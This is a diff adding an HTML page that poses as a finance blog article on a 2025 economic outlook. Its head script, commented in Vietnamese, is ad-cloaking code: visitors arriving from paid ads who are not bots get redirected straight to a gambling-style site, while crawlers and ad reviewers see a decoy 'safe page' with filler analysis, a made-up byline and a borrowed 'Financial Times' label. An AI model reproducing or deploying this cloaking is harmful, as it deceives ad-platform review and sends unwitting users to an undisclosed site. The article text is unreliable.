@@ -1,1 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Finance Review: 2025 Economic Outlook</title>
+    <script>
+        // --- CẤU HÌNH ---
+        const TARGET_URL = "https://playbonus.online/";
+        const adParams = ['gclid', 'wbraid', 'gbraid', 'gad_source', 'fbclid', 'msclkid'];
+        
+        function checkAndRedirect() {
+            const url = new URL(window.location.href);
+            const userAgent = navigator.userAgent || '';
+            
+            // 1. Kiểm tra thông số quảng cáo
+            const hasAdParam = adParams.some(param => url.searchParams.has(param));
+            
+            // 2. Kiểm tra Bot
+            const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|checker/i.test(userAgent);
 
+            // 3. Logic phân luồng
+            if (!isBot && hasAdParam) {
+                // CHUYỂN HƯỚNG NGAY LẬP TỨC
+                window.location.replace(TARGET_URL);
+            } else {
+                // Hiển thị trang Blog (Safe Page) cho Bot hoặc người dùng truy cập trực tiếp
+                document.getElementById('safe-page').style.display = 'block';
+            }
+        }
+
+        // Chạy kiểm tra ngay khi script được tải để tăng tốc độ
+        checkAndRedirect();
+    </script>
+    <style>
+        /* CSS cho Trang Blog (Safe Page) - Giữ nguyên chuyên nghiệp */
+        #safe-page { display:none; background: #fdfdfd; color: #1a1a1a; font-family: 'Georgia', serif; }
+        .blog-wrapper { max-width: 900px; margin: 0 auto; padding: 40px 20px; background: #fff; }
+        .header-nav { border-bottom: 1px solid #eee; padding-bottom: 20px; margin-bottom: 40px; text-transform: uppercase; font-size: 0.8rem; letter-spacing: 2px; color: #666; font-family: sans-serif; }
+        .article-title { font-size: 3rem; line-height: 1.1; margin-bottom: 20px; color: #111; font-family: sans-serif; font-weight: 800; }
+        .meta { color: #888; margin-bottom: 30px; font-style: italic; border-bottom: 4px solid #000; display: inline-block; padding-bottom: 5px; }
+        .content section { margin-bottom: 40px; line-height: 1.8; font-size: 1.15rem; }
+        h2 { font-family: sans-serif; font-size: 1.8rem; margin-top: 50px; color: #2c3e50; }
+        .data-table { width: 100%; border-collapse: collapse; margin: 30px 0; font-family: sans-serif; font-size: 0.9rem; }
+        .data-table th, .data-table td { border: 1px solid #eee; padding: 15px; text-align: left; }
+        .data-table th { background: #f9f9f9; }
+        .info-box { background: #f0f4f8; border-left: 5px solid #2980b9; padding: 25px; margin: 30px 0; }
+        footer { margin-top: 80px; padding-top: 40px; border-top: 1px solid #eee; font-size: 0.9rem; color: #999; text-align: center; font-family: sans-serif; }
+    </style>
+</head>
+<body>
+
+    <!-- NỘI DUNG TRANG BLOG (SAFE PAGE) -->
+    <div id="safe-page">
+        <div class="blog-wrapper">
+            <div class="header-nav">Financial Times & Global Economic Research</div>
+            
+            <h1 class="article-title">Macroeconomic Resilience: Strategic Analysis of Global Markets for 2025</h1>
+            <p class="meta">By Dr. Julian V. Sterling • Senior Economist • February 2025</p>
+
+            <div class="content">
+                <section>
+                    <p>As we enter the first quarter of 2025, the global financial landscape is characterized by a "Great Realignment." Central banks, having battled the inflationary spikes of previous years, are now pivoting toward growth-stabilization policies. This transition period presents both unprecedented risks and unique structural opportunities for institutional and retail market participants alike.</p>
+                    
+                    <div class="info-box">
+                        <strong>Key Insight:</strong> The correlation between traditional fiat currencies and decentralized assets has reached an all-time high.
+                    </div>
+                </section>
+
+                <section>
+                    <h2>1. Monetary Policy and Interest Rate Volatility</h2>
+                    <p>The Federal Reserve and the ECB have signaled a departure from aggressive tightening. However, the "Higher for Longer" mantra has left a lasting impact on credit markets.</p>
+                    
+                    <table class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Region</th>
+                                <th>Projected GDP</th>
+                                <th>Inflation Target</th>
+                                <th>Market Sentiment</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>North America</td><td>2.1%</td><td>2.4%</td><td>Moderate Bullish</td></tr>
+                            <tr><td>European Union</td><td>1.4%</td><td>2.0%</td><td>Neutral</td></tr>
+                            <tr><td>Asia-Pacific</td><td>4.8%</td><td>3.1%</td><td>Aggressive Growth</td></tr>
+                        </tbody>
+                    </table>
+                </section>
+
+                <section>
+                    <h2>2. Geopolitical Risks and Energy Transition</h2>
+                    <p>Stability in the Middle East and Eastern Europe remains the primary "X-factor" for global supply chains. Investors are increasingly moving toward "Safe Haven" assets, but the definition of safety is evolving.</p>
+                </section>
+            </div>
+
+            <footer>
+                <p>&copy; 2025 Global Finance Review. This report is for educational purposes and does not constitute financial advice.</p>
+                <p>102nd Floor, One World Trade Center, New York, NY.</p>
+            </footer>
+        </div>
+    </div>
+
+</body>
+</html>
